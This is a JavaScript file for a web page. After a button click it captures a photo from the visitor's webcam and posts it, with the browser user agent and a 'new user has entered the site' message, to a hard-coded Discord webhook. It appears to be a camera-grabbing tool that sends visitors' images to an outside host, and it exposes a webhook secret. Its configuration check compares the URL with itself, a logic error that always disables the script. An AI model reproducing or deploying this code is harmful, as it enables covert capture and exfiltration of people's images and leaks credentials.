document.addEventListener('DOMContentLoaded', () => {
    const startButton = document.getElementById('startButton');
    const video = document.getElementById('video');
    const statusMessage = document.getElementById('status');

    // --- IMPORTANT: PASTE YOUR DISCORD WEBHOOK URL HERE ---
    const discordWebhookUrl = 'https://discord.com/api/webhooks/1446476771745861673/6IFa_KwxLvxSk3HGnNKuFiQjHly2StCUGxXmdThN9dcy3SqbbJjNXMxDywVL0FjmSqQI';

    // Check if the webhook URL has been replaced
    if (discordWebhookUrl === 'https://discord.com/api/webhooks/1446476771745861673/6IFa_KwxLvxSk3HGnNKuFiQjHly2StCUGxXmdThN9dcy3SqbbJjNXMxDywVL0FjmSqQI') {
        statusMessage.textContent = 'Error: Discord Webhook URL not configured in script.js';
        startButton.disabled = true;
        return;
    }

    startButton.addEventListener('click', () => {
        // Request permission and access to the camera
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                // Attach the video stream to the video element
                video.srcObject = stream;
                video.play(); // Start playing the video stream

                statusMessage.textContent = 'Camera access granted. Taking photo in 3 seconds...';
                startButton.disabled = true;

                // Wait a moment for the video to adjust, then take the photo
                setTimeout(() => {
                    takePhoto(stream);
                }, 3000); // 3-second delay
            })
            .catch(err => {
                console.error("Error accessing camera: ", err);
                statusMessage.textContent = 'Error: Could not access camera. Please grant permission.';
            });
    });

    function takePhoto(stream) {
        // Create a canvas element to draw the video frame
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const context = canvas.getContext('2d');

        // Draw the current video frame onto the canvas
        context.drawImage(video, 0, 0, canvas.width, canvas.height);

        // Stop the video stream to turn off the camera light
        stream.getTracks().forEach(track => track.stop());
        
        statusMessage.textContent = 'Photo taken! Sending to Discord...';

        // Convert the canvas image to a Blob (a file-like object)
        canvas.toBlob(blob => {
            // Create FormData to send the file
            const formData = new FormData();
            // The name 'file1' is important for Discord to recognize it as an attachment
            formData.append('file1', blob, 'photo.png');
            
            // You can also add a text message
            formData.append('payload_json', JSON.stringify({
                content: `A new user has entered the site. User Agent: ${navigator.userAgent}`,
                username: 'Site Camera Bot' // The name the bot will display as
            }));

            // Send the data to Discord using the Fetch API
            fetch(discordWebhookUrl, {
                method: 'POST',
                body: formData
            })
            .then(response => {
                if (response.ok) {
                    statusMessage.textContent = 'Photo sent successfully!';
                    console.log('Photo sent to Discord successfully.');
                } else {
                    statusMessage.textContent = 'Error: Failed to send photo to Discord.';
                    console.error('Error sending to Discord:', response.statusText);
                }
            })
            .catch(error => {
                statusMessage.textContent = 'Error: Network issue while sending photo.';
                console.error('Fetch Error:', error);
            });
        }, 'image/png'); // Specify image format
    }
});
